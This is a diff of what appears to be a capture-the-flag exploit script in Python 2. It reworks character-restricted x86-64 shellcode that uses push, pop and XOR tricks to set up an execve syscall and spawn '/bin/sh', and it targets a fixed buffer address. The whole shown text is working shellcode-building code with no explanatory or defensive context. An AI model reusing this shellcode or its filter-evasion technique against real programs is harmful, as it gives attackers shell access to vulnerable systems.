@@ -29,9 +29,9 @@ Y   = pop rcx
     pop rsi
     pop rdx
 
-    push 0x3b3a5a3b
+    push 0x3b395a3b
     pop rax
-    xor rax, 0x3b5a4b3b
+    xor rax, 0x3b594b3b
     push rax
     pop rsp
 
@@ -39,13 +39,21 @@ Y   = pop rcx
     pop rax
     xor rax, 0x3b3b3b3b
     push rax
-    
+
+    pop rcx
+    pop rcx
+    pop rcx
+    push rsp
+    pop rdi
+
+    push 0x3b
+    pop rax
 '''
 
-name = 0x6010c0 # 0x601100 = 0x3b3a5a3b ^ 0x3b5a4b3b
+name = 0x6010c0 # 0x601100 = 0x3b395a3b ^ 0x3b594b3b
 
-sc = 'j;X4;PP^ZXXXXXXXXXXXXh4>;;XH5;;;;PXXXXj;XT_j;YYY' + 'D' * 0x20 + '/bin/sh' 
-sc = 'j;X4;PP^Zh;Z:;XH5;KZ;P\\h4>;;XH5;;;;P'
+sc = 'j;X4;PP^Zh;Z9;XH5;KY;P\\h4>;;XH5;;;;PYYYT_j;X'
+sc = sc + 'Y' * ( 0x50 - len( sc ) ) + '/bin/sh'
 
 print len( sc )
 
